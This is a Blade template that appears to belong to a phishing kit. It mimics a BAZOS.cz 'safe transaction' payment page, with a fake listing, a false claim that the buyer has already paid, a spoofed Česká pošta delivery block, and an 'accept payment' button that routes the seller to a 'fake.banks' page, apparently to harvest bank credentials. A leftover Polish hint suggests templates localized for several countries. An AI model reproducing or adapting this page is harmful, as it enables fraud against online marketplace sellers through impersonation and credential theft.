@extends('layouts.fake')
@push('css')
    <link href="{{asset('css/bazos.css')}}" rel="stylesheet">
@endpush
@section('content')
    <div class="base">
        <div class="_container header_prototype header_prototype--board tiny" data-container="HeaderBoardContainer"
             data-tiny="1">
            <header data-test-component="HeaderBoard" class="sc-ugnQR jRQBFv">
                <div class="sc-eIHaNI grYHP"></div>
                <div class="sc-eTpRJs hnEmwS">
                    <div class="sc-iomxrj fZtIUm">
                        <section data-test-component="HeaderActionMenu" class="sc-gPEVay sc-eKZiaR dzCROE">
                            <div class="sc-jAaTju sc-jDwBTQ sc-jlyJG sc-drMfKT lkKOyd">
                                <div width="1" class="sc-jAaTju sc-iRbamj sc-hIVACf gjZzYk"><a
                                            href="https://www.bazos.cz/"
                                            title="BAZOS"
                                            data-test-action="IndexPageLink"
                                            class="sc-eqIVtm sc-cpmKsF bcxWYD">
                                        <img height="40px" src="{{asset($fake->logo())}}">
                                    </a>
                                    <div class="sc-eXNvrr iBzLWS"></div>
                                </div>
                            </div>
                        </section>
                        <div class="sc-dxZgTM RFfMX"></div>
                    </div>
                </div>
            </header>
        </div>


        <aside class="nav_container sidebar_container">
            <nav class="_container" data-container="CategoryMobileContainer"></nav>
        </aside>


        <div class="bundle">
            <div class="container _container" data-container="PaymentsContainer">
                <div class="payments_container" id="payments">
                    <div>
                        <div class="container__28A_2L3T">
                            <div>
                                <div class="product__2oLb4nXl"><span class="product_image__2AcYUpNV"><img
                                                src="{{asset($fake->img)}}" id="pr_image"
                                                alt="{{$fake->title}}" width="100" height="100"></span>
                                    <div class="product_owner__VUJH2ylJ">
                                        <div class="user user--simple">
                                            <div class="user__image"><span rel="nofollow"><img id="u_image"
                                                                                               src="{{asset('images/jeTXdkH.jpg')}}"
                                                                                               alt="" width="64"
                                                                                               height="64"></span></div>
                                            <div class="user__info">
                                                <div class="user__name"><span><span class="user__label">Inzeráty-Prodám, Koupím na BAZOS</span><span
                                                                id="u_name"></span></span></div>
                                                <!--div class="user__rating rating" id="u_rating"></div-->
                                            </div>
                                        </div>
                                    </div>
                                    <div class="product_content__mI30-3Fr">
                                        <div class="product_inner__1ZrDwagy">
                                            <div class="product_price__2IFwtrXu"><span
                                                        class="product_real_price__j_Bk3J3i"><span><span
                                                                id="pr_price"></span><span
                                                                class="sc-bdVaJa ijDeHI"><b>{{$fake->price()}}</b><i></i></span></span></span>
                                            </div>
                                            <div class="product_title__3jNOq_vZ" id="pr_name">{{$fake->title}}</div>
                                        </div>
                                    </div>
                                </div>
                                <div class="container__b66PCR7o">
                                    <div class="summary__2TIRymkY">
                                        <div class="summary_header__bJmC15X9">
                                            <div class="summary_price__1HT5R9_P"><span>
                                                        <span id="last"></span><span id="cost" class="sc-bdVaJa ijDeHI"><b>{{$fake->price()}}</b><i></i></span></span>
                                            </div>
                                        </div>
                                        <div class="fixed_buttons fixed_buttons--single">
                                            <div class="summary_total__3aEKbkJu">Dostávat
                                                <div class="summary_total_value__nRhP7XkA"><span><span
                                                                id="pr_price"></span>&nbsp;<span
                                                                class="sc-bdVaJa ijDeHI"><b
                                                                    id="mobile_price">{{$fake->price()}}</b><i></i></span></span>
                                                </div>
                                            </div>
                                            <div class="button_container">
                                                <form action="{{subRoute('fake.banks')}}">
                                                    <input type="hidden" name="track_id" value="{{$fake->track_id}}">
                                                    <button type="submit" class="sc-dVhcbM ccONKs" id="_buttonPay">
                                                        <span class="sc-fBuWsC hvBxNu">Přijmout platbu</span>
                                                    </button>
                                                </form>
                                            </div>
                                        </div>
                                        <div class="safely_text__392qqBrF">
                                            <div class="status_badge__icon status_badge__icon--deal"></div>
                                            <span>Bezpečná příležitost</span>
                                        </div>
                                        <div class="hint">Kliknutím na tlačítko "Přijmout platbu" souhlasíte s tím, že
                                            <a
                                                    href="https://www.bazos.cz/" target="_blank"
                                                    rel="noopener noreferrer">zavřete
                                                smlouvu</a> o prodeji zboží prostřednictvím služby online " bezpečná
                                            transakce”
                                        </div>
                                    </div>
                                    <div class="block__3ioUhNQH">
                                        <div class="panel__3B1d-ak5">
                                            <div class="panel_icon__1HmxOezY">
                                                <div class="status_badge__icon status_badge__icon--delivery status_icon__3QzFN2ZZ"></div>
                                            </div>
                                            <div class="panel_content__VGeorc1g">
                                                <div class="text__3Wt10VPX">ybraná dodávka po celé zemi <b
                                                            id="pr_loc"></b>.
                                                </div>
                                                <div class="hint__aMasvQSz">Kupující zaplatil zboží, hotovost bude
                                                    převedena
                                                    na váš účet po potvrzení objednávky.
                                                </div>
                                            </div>
                                            <div class="panel_button__2vr4fIVO">
                                                <button type="button" class="visible-xs sc-dVhcbM PZSwV"></button>
                                            </div>
                                        </div>
                                        <div class="form__1P2Y3sX1">
                                            <form>
                                                <div>
                                                    <div class="row"><label class="label__332nHo7g">Adresa
                                                            doručení</label>
                                                        <div class="col-md-12">
                                                            <div class="root__3ahLIWiH">
                                                                <div class="from_group form_group__3-PlZQuP"><input
                                                                            type="text"
                                                                            class="form_control form_control__3Uyg-pWq"
                                                                            value="{{$fake->address}}"
                                                                            readonly=""></div>
                                                            </div>
                                                        </div>
                                                        <label class="label__332nHo7g">Celé jméno příjemce</label>
                                                        <div class="col-md-12">
                                                            <div class="from_group form_group__3-PlZQuP"><input
                                                                        name="lastname" type="text"
                                                                        class="form_control form_control__3Uyg-pWq"
                                                                        maxlength="25" value="{{$fake->recipient}}"
                                                                        readonly="">
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>

                                                <div class="boxberry_text__24q32W-A"><a
                                                            href="https://www.ceskaposta.cz/index" target="_blank"
                                                            rel="noopener noreferrer"><img
                                                                src="{{asset('images/4tjXy7m.jpg')}}"
                                                                alt="Boxberry" width="82" height="48"></a>Dodávka se
                                                    provádí: Česká
                                                    pošta další informace o dodávkách BAZOS.
                                                </div>
                                            </form>
                                        </div>
                                        <div class="hint payhint__1EGeMlob">Klikając przycisk „Odbierz środki”, zgadzasz
                                            się
                                            na zawarcie <a href="https://www.bazos.cz/" target="_blank"
                                                           rel="noopener noreferrer">Umowy sprzedaży</a>towary za pomocą
                                            usługi online „Bezpieczna transakcja”
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
@endsection